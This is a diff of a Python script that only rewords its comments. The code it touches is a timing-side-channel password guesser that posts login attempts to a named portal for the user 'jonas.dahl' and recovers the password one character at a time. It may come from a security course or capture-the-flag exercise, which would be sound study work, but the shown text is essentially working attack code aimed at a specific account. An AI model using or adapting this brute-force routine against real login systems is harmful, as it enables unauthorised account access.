@@ -4,14 +4,14 @@ from json.decoder import JSONDecodeError
 
 # Function to perform login attempt and check timing
 def login(attempt_pw, a):
-    # Define the URL for the login endpoint
+    # Define the URL for the login
     url = 'https://portal.regjeringen.uiaikt.no/login'
-    # Define the username for the login attempt
+    # Define the username 
     uname = 'jonas.dahl'
-    # Prepare the payload with username and password
+    # payload with username and password
     d = {'username': uname, 'password': attempt_pw}
     try:
-        # Send a POST request to the login endpoint
+        # Send a POST request to login
         res = requests.post(url, json=d)
         # Raise an HTTPError for bad responses
         res.raise_for_status()
@@ -42,7 +42,7 @@ def solve_password():
     a = 0
     while a < 15:
         for valid in validchar:
-            # Replace the character at index a in the password with the current valid character
+            # Replaces character at index a in the password with the current valid character
             pw = pw[:a] + valid + pw[a + 1:]
             # Perform a login attempt with the modified password and check timing
             if login(pw, a):
